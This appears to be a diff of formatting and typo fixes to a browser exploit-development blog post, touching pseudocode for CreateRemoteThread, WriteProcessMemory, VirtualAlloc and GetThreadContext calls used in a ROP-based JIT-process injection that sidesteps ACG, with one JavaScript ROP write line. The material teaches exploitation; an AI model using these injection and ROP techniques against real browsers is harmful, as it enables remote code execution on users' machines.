@@ -3619,17 +3619,17 @@ We now have a remote allocation within the JIT process, where we have written ou
 
 ```c
 CreateRemoteThread(
-	fulljitHandle,				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Default SECURITY_ATTRIBUTES
-	0,							// Default Stack size
+	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Default SECURITY_ATTRIBUTES
+	0,				// Default Stack size
 	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
-	NULL,						// No variable needs to be passed
-	4,							// CREATE_SUSPENDED (Create the thread in a suspended state)
-	NULL 						// Don't return the thread ID (we don't need it)
+	NULL,				// No variable needs to be passed
+	4,				// CREATE_SUSPENDED (Create the thread in a suspended state)
+	NULL 				// Don't return the thread ID (we don't need it)
 );
 ```
 
-This call requires mostly everything to be set to `NULL` or `0`, with the exception of two parameters. We are creating our thread in a suspended state to ensure execution doesn't occur until we explicitly resume the thread. This is because we still need to overwrite the RSP register of this thread with our final-stage ROP chain, before the `ret` occurs. Since we are setting the `lpStartAddress` parameter to the address of a ROP gadget, this effectively is the entry point for this newly-created thread and it should be the function called. Since it is a ROP gadget that will just return to the stack. So, when we eventually resume this thread, our thread (which is executing in he remote JIT process, where ACG is _disabled_), will return to whatever is located on the stack. We will eventually update RSP to point to.
+This call requires mostly everything to be set to `NULL` or `0`, with the exception of two parameters. We are creating our thread in a suspended state to ensure execution doesn't occur until we explicitly resume the thread. This is because we still need to overwrite the RSP register of this thread with our final-stage ROP chain, before the `ret` occurs. Since we are setting the `lpStartAddress` parameter to the address of a ROP gadget, this effectively is the entry point for this newly-created thread and it should be the function called. Since it is a ROP gadget that performs `ret`, execution should just return to the stack. So, when we eventually resume this thread, our thread (which is executing in he remote JIT process, where ACG is _disabled_), will return to whatever is located on the stack. We will eventually update RSP to point to.
 
 Here is how this looks in ROP form (with all previous ROP chains added for context):
 
@@ -4044,7 +4044,7 @@ Our call to `CreateRemoteThread` is now in this state:
 
 ```c
 CreateRemoteThread(
-	fulljitHandle,				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
 	-
 	-
 	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
@@ -4062,8 +4062,8 @@ Easy as you'd like! Our call is now in the following state:
 
 ```c
 CreateRemoteThread(
-	fulljitHandle,				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Default SECURITY_ATTRIBUTES
+	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Default SECURITY_ATTRIBUTES
 	-
 	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
 	-
@@ -4080,9 +4080,9 @@ We are now in the following state:
 
 ```c
 CreateRemoteThread(
-	fulljitHandle,				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Default SECURITY_ATTRIBUTES
-	0,							// Default Stack size
+	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Default SECURITY_ATTRIBUTES
+	0,				// Default Stack size
 	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
 	-
 	-
@@ -4100,13 +4100,13 @@ Our call is now in its final state:
 
 ```c
 CreateRemoteThread(
-	fulljitHandle,				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Default SECURITY_ATTRIBUTES
-	0,							// Default Stack size
+	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Default SECURITY_ATTRIBUTES
+	0,				// Default Stack size
 	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
-	NULL,						// No variable needs to be passed
-	4,							// CREATE_SUSPENDED (Create the thread in a suspended state)
-	NULL 						// Don't return the thread ID (we don't need it)
+	NULL,				// No variable needs to be passed
+	4,				// CREATE_SUSPENDED (Create the thread in a suspended state)
+	NULL 				// Don't return the thread ID (we don't need it)
 );
 ```
 
@@ -4197,7 +4197,7 @@ inc();
 
 This is a `VirtualProtect` ROP chain, which will mark the target pages as RWX. As we know we cannot _directly_ allocate and execute RWX pages via remote injection (`VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread`). So, instead, we will eventually leak the stack of our remote thread that exists within the JIT process (where ACG is disabled). When we resume the thread, our ROP chain will kick off and mark our shellcode as RWX. However, there is a slight problem with this. Let me explain.
 
-We know our shellcode resides in the JIT process at whatever memory address `VirtualAllocEx` decided. However, our `VirtualProtect` ROP chain (shown above and at the beginning of this blog post) was embedded within the `.data` section of the content process (in order to store it, so we can inject it later when the time comes). The issue we are facing is that of a "runtime proble" as our `VirtualProtect` ROP chain has no way to know what address our shellcode will reside in via our `VirtualAllocEx` ROP chain. This is not only because the remote allocation occurs _after_ we have "preserved" our `VirtualProtect` ROP chain, but also because when `VirutalAllocEx` allocates memory, we request a "private" region of memory, which is "randomized", and is subject to change after each call to `VirtualAllocEx`. We can see this in the following gadget:
+We know our shellcode resides in the JIT process at whatever memory address `VirtualAllocEx` decided. However, our `VirtualProtect` ROP chain (shown above and at the beginning of this blog post) was embedded within the `.data` section of the content process (in order to store it, so we can inject it later when the time comes). The issue we are facing is that of a "runtime problem" as our `VirtualProtect` ROP chain has no way to know what address our shellcode will reside in via our `VirtualAllocEx` ROP chain. This is not only because the remote allocation occurs _after_ we have "preserved" our `VirtualProtect` ROP chain, but also because when `VirutalAllocEx` allocates memory, we request a "private" region of memory, which is "randomized", and is subject to change after each call to `VirtualAllocEx`. We can see this in the following gadget:
 
 ```javascript
 write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
@@ -4223,11 +4223,11 @@ Here is how this call is setup:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 					// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
 	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
 	addressof(VirtualAllocEx_Allocation),			// Address of our VirtualAllocEx allocation (where our shellcode resides in the JIT process at this point in the exploit)
-	0x8												// 64-bit pointer size (sizeof(QWORD)))
-	NULL 											// Optional
+	0x8							// 64-bit pointer size (sizeof(QWORD)))
+	NULL 							// Optional
 );
 ```
 
@@ -4698,7 +4698,7 @@ WriteProcessMemory(
 	-
 	-
 	-
-	0x8												// 64-bit pointer size (sizeof(QWORD)))
+	0x8							// 64-bit pointer size (sizeof(QWORD)))
 	-
 );
 ```
@@ -4711,10 +4711,10 @@ Our call is now in the current state:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 					// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
 	-
 	-
-	0x8												// 64-bit pointer size (sizeof(QWORD)))
+	0x8							// 64-bit pointer size (sizeof(QWORD)))
 	-
 );
 ```
@@ -4727,10 +4727,10 @@ Our call is now in the current state:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 					// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
 	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
 	-
-	0x8												// 64-bit pointer size (sizeof(QWORD)))
+	0x8							// 64-bit pointer size (sizeof(QWORD)))
 	-
 );
 ```
@@ -4743,10 +4743,10 @@ Our call is now in the following state:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 					// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
 	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
 	addressof(VirtualAllocEx_Allocation),			// Address of our VirtualAllocEx allocation (where our shellcode resides in the JIT process at this point in the exploit)
-	0x8												// 64-bit pointer size (sizeof(QWORD)))
+	0x8							// 64-bit pointer size (sizeof(QWORD)))
 	-
 );
 ```
@@ -5322,10 +5322,10 @@ Here is how our call will be setup:
 
 ```c
 VirtualAlloc(
-	NULL,						// Let the system decide where to allocate the memory
-	sizeof(CONTEXT),			// The size we want to allocate (size of a CONTEXT structure)
+	NULL,				// Let the system decide where to allocate the memory
+	sizeof(CONTEXT),		// The size we want to allocate (size of a CONTEXT structure)
 	MEM_COMMIT | MEM_RESERVE,	// Make sure this memory is committed and reserved
-	PAGE_READWRITE				// Make sure the page is writable so GetThreadContext can write to it
+	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
 );
 ```
 
@@ -5928,7 +5928,7 @@ VirtualAlloc(
 	-
 	-
 	-
-	PAGE_READWRITE				// Make sure the page is writable so GetThreadContext can write to it
+	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
 );
 ```
 
@@ -5940,10 +5940,10 @@ This brings our call to the following state:
 
 ```c
 VirtualAlloc(
-	NULL,						// Let the system decide where to allocate the memory
+	NULL,				// Let the system decide where to allocate the memory
 	-
 	-
-	PAGE_READWRITE				// Make sure the page is writable so GetThreadContext can write to it
+	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
 );
 ```
 
@@ -5955,10 +5955,10 @@ This brings us to the following state - with only one more parameter to deal wit
 
 ```c
 VirtualAlloc(
-	NULL,						// Let the system decide where to allocate the memory
-	sizeof(CONTEXT),			// The size we want to allocate (size of a CONTEXT structure)
+	NULL,				// Let the system decide where to allocate the memory
+	sizeof(CONTEXT),		// The size we want to allocate (size of a CONTEXT structure)
 	-
-	PAGE_READWRITE				// Make sure the page is writable so GetThreadContext can write to it
+	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
 );
 ```
 
@@ -5970,10 +5970,10 @@ This completes our parameters:
 
 ```c
 VirtualAlloc(
-	NULL,						// Let the system decide where to allocate the memory
-	sizeof(CONTEXT),			// The size we want to allocate (size of a CONTEXT structure)
+	NULL,				// Let the system decide where to allocate the memory
+	sizeof(CONTEXT),		// The size we want to allocate (size of a CONTEXT structure)
 	MEM_COMMIT | MEM_RESERVE,	// Make sure this memory is committed and reserved
-	PAGE_READWRITE				// Make sure the page is writable so GetThreadContext can write to it
+	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
 );
 ```
 
@@ -6014,8 +6014,8 @@ This means that _before_ we call `GetThreadContext`, we need to write to our buf
 VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f
 
 GetThreadContext(
-	threadHandle,									// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
-	addressof(VirtualAlloc_buffer)					// The buffer to receive the CONTEXT structure
+	threadHandle,					// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
+	addressof(VirtualAlloc_buffer)			// The buffer to receive the CONTEXT structure
 );
 ```
 
@@ -6701,7 +6701,7 @@ The next thing we will do is _also_ preserve our `VirtualAlloc` allocation, spec
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion161.png" alt="">
 
-At this point we have successfully saved out `CONTEXT` address and out `CONTEXT.ContextFlags` address in memory for persistent storage, for the duration of the exploit.
+At this point we have successfully saved out `CONTEXT` address and our `CONTEXT.ContextFlags` address in memory for persistent storage, for the duration of the exploit.
 
 The next thing we will do is update `CONTEXT.ContextFlags`. Since we have already preserved the address of `ContextFlags` in memory (`.data` section of `kernelbase.dll`), we can simply `pop` this address into a register, dereference it, and update it accordingly (the `pop rax` gadget below is, again, to bypass the `cmp` instruction that is a residual instruction in our ROP gadget which requires a valid, writable address).
 
@@ -6732,12 +6732,12 @@ At this point our call is in the following state:
 VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f
 
 GetThreadContext(
-	threadHandle,									// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
+	threadHandle,					// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
 	-
 );
 ```
 
-For our last parameter, `lpContext`, we simply just need to pass in the pointer returned earlier from `VirtualAlloc` (which we stored in the `.data` section of `kernelbase.dll`). Again, we use the same `mov rdx, [rdx+0x8]` gadget we have seen in this blog post. So instead of directly popping the address which points to our `VirtualAlloc` allocation, we pass in the address - `0x8` so that when the dereference happens, the `+0x8` and the -`0x8` offset each other. This is done with the following ROP gadgets:
+For our last parameter, `lpContext`, we simply just need to pass in the pointer returned earlier from `VirtualAlloc` (which we stored in the `.data` section of `kernelbase.dll`). Again, we use the same `mov rdx, [rdx+0x8]` gadget we have seen in this blog post. So instead of directly popping the address which points to our `VirtualAlloc` allocation, we pass in the address - `0x8` so that when the dereference happens, the `+0x8` and the `-0x8` offset each other. This is done with the following ROP gadgets:
 
 ```javascript
 // LPCONTEXT lpContext
@@ -6755,8 +6755,8 @@ Our call, after the above gadgets, is now ready to go as such:
 VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f
 
 GetThreadContext(
-	threadHandle,									// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
-	addressof(VirtualAlloc_buffer)					// The buffer to receive the CONTEXT structure
+	threadHandle,					// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
+	addressof(VirtualAlloc_buffer)			// The buffer to receive the CONTEXT structure
 );
 ```
 
